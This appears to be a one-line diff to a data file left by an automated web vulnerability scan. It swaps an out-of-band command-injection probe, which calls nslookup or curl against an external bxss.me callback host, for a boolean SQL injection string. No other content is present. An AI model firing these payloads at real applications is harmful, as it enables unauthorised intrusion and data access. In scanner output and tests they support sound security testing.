@@ -1,1 +1,1 @@
-(nslookup -q=cname hitokunxcybyxa3731.bxss.me||curl hitokunxcybyxa3731.bxss.me))
+-1' OR 2+365-365-1=0+0+0+1 or 'KC51axo0'='
